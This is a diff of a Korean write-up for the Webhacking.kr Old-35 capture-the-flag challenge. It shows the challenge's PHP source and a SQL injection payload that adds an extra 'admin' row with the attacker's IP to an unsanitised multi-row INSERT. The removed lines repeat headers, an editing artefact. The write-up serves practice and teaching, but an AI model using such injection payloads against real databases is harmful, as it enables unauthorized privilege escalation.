@@ -1,94 +1,3 @@
-# Payload
-```text
-123),('admin','117.111.28.138',123
-```
-
-# 검색 키워드
-- SQL Injection
-# 해설
-
-![[Pasted image 20250510203752.png]]
-
-# 서론 : Webhacking.kr 문제풀기
-
-## 팀명 :
-## 조원
-
-## 조원 역할분담
--
-## 팀명 선정이유
--
-
----
-# 본론
-## 1. Old-35 문제풀이
-- 문제분류 : SQL Injection
-- 풀이환경 : Chrome 136.0.7103.93
-### 키워드
-- SQL Inejction
-- `$_SERVER['REMOTE_ADDR']`
-- Regex
-### 문제 탐색
-- 문제 메인 화면은 다음과 같다.
-	- 전화번호를 입력할 수 있는 칸이 있고, add 버튼으로 추가할 수 있다.
-![[Pasted image 20250511024720.png]]
-
-- view-source 버튼을 누르면 소스 코드를 볼 수 있다. 소스 코드는 다음과 같다.
-```php
-<?php
-  include "../../config.php";
-  if($_GET['view_source']) view_source();
-?><html>
-<head>
-<title>Challenge 35</title>
-<head>
-<body>
-<form method=get action=index.php>
-phone : <input name=phone size=11 style=width:200px>
-<input name=id type=hidden value=guest>
-<input type=submit value='add'>
-</form>
-<?php
-$db = dbconnect();
-if($_GET['phone'] && $_GET['id']){
-  if(preg_match("/\*|\/|=|select|-|#|;/i",$_GET['phone'])) exit("no hack");
-  if(strlen($_GET['id']) > 5) exit("no hack");
-  if(preg_match("/admin/i",$_GET['id'])) exit("you are not admin");
-  mysqli_query($db,"insert into chall35(id,ip,phone) values('{$_GET['id']}','{$_SERVER['REMOTE_ADDR']}',{$_GET['phone']})") or die("query error");
-  echo "Done<br>";
-}
-
-$isAdmin = mysqli_fetch_array(mysqli_query($db,"select ip from chall35 where id='admin' and ip='{$_SERVER['REMOTE_ADDR']}'"));
-if($isAdmin['ip'] == $_SERVER['REMOTE_ADDR']){
-  solve(35);
-  mysqli_query($db,"delete from chall35");
-}
-
-$phone_list = mysqli_query($db,"select * from chall35 where ip='{$_SERVER['REMOTE_ADDR']}'");
-echo "<!--\n";
-while($r = mysqli_fetch_array($phone_list)){
-  echo htmlentities($r['id'])." - ".$r['phone']."\n";
-}
-echo "-->\n";
-?>
-<br><a href=?view_source=1>view-source</a>
-</body>
-</html>
-```
-
-- 개발자 도구를 활용하여 원본 웹페이지 소스를 확인하면 다음과 같다.
-```html
-# Payload
-```text
-123),('admin','117.111.28.138',123
-```
-
-# 검색 키워드
-- SQL Injection
-# 해설
-
-![[Pasted image 20250510203752.png]]
-
 # 서론 : Webhacking.kr 문제풀기
 
 ## 팀명 :
@@ -202,4 +111,24 @@ echo "-->\n";
 	- 서버 측 php 코드에서 id값이 admin으로 전달되었다면 `you are not admin`문구 출력과 함께 더이상 진행되지 않는다.
 	- 따라서 guest 값은 그대로 둔다.
 - 서버 측 php 코드에서, mysql에 insert 구문 실행시, 사용자가 입력한 값을 Prepared Statement를 사용하지 않고 그대로 쿼리문에 추가하여 사용하고 있다.
-- 
+- 플래그를 획득하기 위해서는 admin으로서의 IP에 본인의 IP를 입력하여야 한다. 이 부분은 SQL Injection을 통해 해결해야 한다.
+### 페이로드
+```text
+1234),('admin','117.111.xxx.xxx',1234
+```
+- 실제 IP 주소는 마스킹 처리하였다.
+- whatismyip 웹페이지에 접속하여 나오는 본인의 현재 IP로 내용을 변경하면 된다.
+### 원리
+- SQL의 Insert 구문은 여러 행을 한꺼번에 삽입할 수 있다는 점을 이용하였다.
+- 원래 의도된 쿼리는 다음과 같다.
+```sql
+insert into chall35(id, ip, phone) values('guest','111.117.xxx.xxx',1234);
+```
+- 하지만 입력값을 검증하지 않고 쿼리문에 바로 사용하는 것을 이용하여 SQL 구문을 변경할 수 있다.
+- 따라서 페이로드와 같이 입력 양식에 입력하게 되면 쿼리가 다음과 같이 변경된다.
+```sql
+insert into chall35(id, ip, phone) values('guest', '111.117.xxx.xxx', 1234), ('admin', '111.117.xxx.xxx', 1234);
+```
+- 위 쿼리가 실행되면, DB에는 두 개의 행이 저장되고, 뒤따르는 admin IP가 현재 접속한 사용자 IP와 일치하는지 검증하는 코드 실행시 결과값이 참이 되어 `solve(35)` 함수가 실행, 플래그를 얻을 수 있다.
+### 결과
+![[Pasted image 20250510203752.png]]
